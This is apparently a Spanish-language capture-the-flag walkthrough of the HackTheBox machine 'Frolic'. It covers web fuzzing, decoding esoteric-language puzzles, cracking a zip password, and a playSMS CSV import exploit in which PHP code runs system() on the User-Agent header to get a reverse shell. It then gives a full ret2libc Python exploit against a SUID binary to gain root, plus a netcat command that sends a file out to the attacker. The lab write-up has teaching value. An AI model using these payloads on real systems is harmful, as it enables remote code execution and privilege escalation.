10.10.10.111 Frolic

![Frolic](https://user-images.githubusercontent.com/96772264/198895612-142d24de-7393-4cd0-950a-56fe560ab910.png)

-------------------
# Part 1: Enumeración web 

Puertos abiertos
22,139,445,1880,9999

- EL nombre del sistema es frolic

### Puerto 9999
Web por defecto de nginx, pero nos da la direccion forlic.htb:1880/ (añadir forlic a la ip en /etc/hosts)
```console
└─$ whatweb http://10.10.10.111:9999                                                                            13[200 OK] HTML5, HTTPServer[Ubuntu Linux], IP[10.10.10.111], Title[Welcome to nginx!], nginx[1.10.3]
```

### Puerto 1880
Node-red, las creds por defecto no funcionan NR_account:NodeRed#0123
```console
└─$ whatweb http://10.10.10.111:1880                                                                            13[200 OK] Bootstrap, HTML5, IP[10.10.10.111], Script[text/x-red], Title[Node-RED], X-Powered-By[Express]
```

Probamos a hacer fuzzing con la web nginx.
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.111:9999/FUZZ/
000000245:   200        25 L     63 W       634 Ch      "admin"                                              
000000597:   200        1006 L   5031 W     84162 Ch    "test"                                               
000000820:   403        7 L      11 W       178 Ch      "dev"                                                
000001612:   200        3 L      3 W        28 Ch       "backup"                                             
000011647:   403        7 L      11 W       178 Ch      "loop" 
```

/admin
Formulario de registro, pone "vamos, soy hackeable, Nota: Nada", tira de /js/login.js y este script dice que hay
tres intentos de login, pero da las contraseñas admin:superduperlooperpassword_lol, aun asi no hace falta 
ponerle porque nos da la ruta *success.html* que viene a ser muchos "." "?" y "!" 

![forlic1](https://user-images.githubusercontent.com/96772264/198895706-684947e3-cd43-41a3-a044-3192a085b075.PNG)

/test
es un phpinfo()

/backup
password.txt user.txt loop/ 
- /password.txt -> password - imnothuman
- /user.txt -> user - admin
- /loop -> forbidden

Estas creds no me sirven para el node-red.

-------------------
# Part 2: Lenguajes Esotericos 

El mensaje success.html (muchas series de 5 caracteres mezclando ".","?" y "!" -> ej .!?!!)
Eso es un "esoteric programming languaje", en concreto Ook!
En esta [web](https://www.dcode.fr/ook-language) nos lo descifra como ```Nothing here check /asdiSIAJJ0QWE9JAS```

Visitando la ruta 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ tenemos otro texto cifrado, parece base64 pero tiene 
espacios.
```console
└─$ echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA " | tr -d " " | base64 -d > archivo
└─$ file archivo
archivo: Zip archive data, at least v2.0 to extract
└─$ mv archivo archivo.zip
└─$ unzip archivo.zip
[archivo.zip] index.php password:
└─$ zip2john archivo.zip > hash
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
password         (archivo.zip/index.php)
```
Pongo la contraseña *password* y crea un index.php, que es un codigo hexadecimal, que descrifrandolo da otro en
base64:

```
# Original (dexadecimal)
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c533
0674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974
624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b3173745069736
74b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b79
73674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c53346750437
3724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a

# xxd -ps -r > texto en base64
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==

# Quitando los saltos de linea y decodificandolo
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```
Otro texto esoterico, en lenguaje "brainfuck" -> idkwhatispass

Ruta /dev 
Nos da un 403, pero aun asi se puede fuzzear
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.111:9999/dev/FUZZ
000000597:   200        1 L      1 W        5 Ch        "test"                                               
000001612:   301        7 L      13 W       194 Ch      "backup"  
```
/backup -> 
Nos da la ruta /playsms, hay un panel de registro al que ingresamos con admin:idkwhatispass.

-------------------
# Part 3: Explotando playsms

Como es una web muy amplia, buscamos vulnerabilidadades con el searchploit.
Hay varios exploits que contemplan la ruta "import.php"

Exploit php/webapps/42044.txt:

En la ruta ```http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list```
se puede subir un archivo .csv con codigo php en uno de los campos, el tema esque dice que la web lee el codigo 
pero no lo ejecuta. Lo que hace es meter el codigo en el USER AGENT 

> USER AGENT > la parte de una peticion http que corresponde al navegador con la que tramitas la peticion
> Archivo CSV > tipo de archivo de datos que guarda valores entre comas.

Para entender lo que es un CSV, la web pediria algo tal y como:
```
Name,Mobile,Email,Group code,Tags
Antonio,665665665,antonio@mariscosrecio,mayorista,no limipio pescado
```
Y el exploit seria tal que asi
```
Name,Mobile,Email,Group code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,22,NULL,NULL,NULL
```
![forlic2](https://user-images.githubusercontent.com/96772264/198895730-23444d3a-ed66-46ce-b917-837327ad2d3c.PNG)
![forlic3](https://user-images.githubusercontent.com/96772264/198895739-e7175968-0c5a-4922-899b-b96f77bd3a62.PNG)

-------------------
# Part 4: Ret2libc 

```console
└─$ sudo nc -nlvp 443
www-data@frolic:
```

Subimos nuestro script con wget (cambiamos /usr/bin/bash por /bin/bash para que funcione):
- Usuarios: root sahay ayush, nosotros somos www-data
- SUIDS -> /home/ayush/.binary/rop
- Hay una sql corriendo pero no hay creds
- La flag del usaurio ayush está en su directorio /home, con permiso de lectura

Como somos www-data (demonio que corre la web) hay un porrón de archivos de playsms, asi que en el script 
comente las lienas respectivas a */var/www* y *archivos de usuario actual* ajustando el script a esta maquina.

```console
www-data@frolic:/home$ /home/ayush/.binary/rop test;echo
[+] Message sent: test
```
El binario es un programa personal, asi que implica explotacion de binarios.

```console
www-data@frolic:/home$ nc 10.10.14.15 444 < /home/ayush/.binary/rop
└─$ sudo nc -nlvp 444 > rop
Ncat: Connection from 10.10.10.111:39390.
www-data@frolic:/home/ayush/.binary$ md5sum rop
001d6cf82093a0d716587169e019de7d  rop
└─$ md5sum rop 
001d6cf82093a0d716587169e019de7d  rop
```
El binario se ha trasnferido perfectamente.

```console
└─$ checksec --file=./rop   
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	    Symbols		 FORTIFY	
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols	 No	0	./rop
```

Como tiene NX activado significa que no pueden ejecutarse instrucciones en la pila, o sea que habrá que tirar
de Ret2libc que utiliza funciones ya existentes en el binario (libreria system)

```console
└─$ gdb -q ./rop
gef➤  disas main
└─$ python3 -c "print('A'* 1000)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
gef➤ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... # Segmentation fault
gef➤  pattern create
[+] Generating a pattern of 1024 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaat...
gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaa... # Segfault
$eip   : 0x6161616e ("naaa"?)
└─$ echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa... | grep "naaa"
└─$ echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa" | wc -c # -> 53 (52 - "\n")
gef➤  pattern offset $eip  # -> [+] Found at offset 52 (little-endian search) likely
```

Vamos a observar la pila:
```
gef➤  disas main
0x080484e1 <+70>:	call   0x80484f8 <vuln>
gef➤ disas vuln
0x08048530 <+56>:	leave
gef➤ b *0x08048530
gef➤ r
gef➤ x/16wx $esp
0xffffd0b0:	0xffffd108	0xf7fa4ff4	0x61616161	0x61616162
0xffffd0c0:	0x61616163	0x61616164	0x61616165	0x61616166
0xffffd0d0:	0x61616167	0x61616168	0x61616169	0x6161616a
0xffffd0e0:	0x6161616b	0x6161616c	0x6161616d	0x6161616e
```

Es decir empieza esp en 0xffffd0b0, aunque empezamos a escribir en 0xffffd0b8 y en 0xffffd0ec.

Para hacer ret2libc se tiene que conseguir estas tres direcciones y pasarselas como input:
> RET2LIBC: offset + función(&system) + retorno(&exit) + argumentos("bin/sh")

En lenguaje de bajo nivel

1.  Se crea la pila con los argumentos (bin/sh), que usa la función system
2.  Se ejecuta, se borran estos argumentos de la pila con LEAVE
3.  Queda la direccion de retorno (a donde va cuando acaba) que se pasa al eip -> POP EIP

Direcciones para ret2lib (las calculamos en la maquina victima porque son diferentes a las nuestras):
Primero obtenemos la base de libc del sistema y a esa se le añaden todos los offsets (bin/sh, system@@, exit@@)
El binario utiliza la libc del sistema, por lo que esas direcciones aplican para él (digamos que libc es una 
liberia que tiene que cargar, como cuando en python importamos modiulos como requests)

```console
www-data@frolic:/tmp$ ldd /home/ayush/.binary/rop
		libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
www-data@frolic:/tmp$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep "bin/sh" 
		15ba0b /bin/sh
www-data@frolic:/tmp$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@| exit@@"
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```
```python
from struct import pack

offset = b'A' * 52
libc = 0xb7e19000
system = pack("<I", libc + 0x0003ada0)
Exit = pack("<I", libc + 0x0002e9d0)
bin_sh = pack("<I", libc + 0x15ba0b)
payload = offset + system + Exit + bin_sh
print(payload)
```
```console
www-data@frolic:/tmp$ /home/ayush/.binary/rop $(python /tmp/exploit.py)
# whoami
root
```
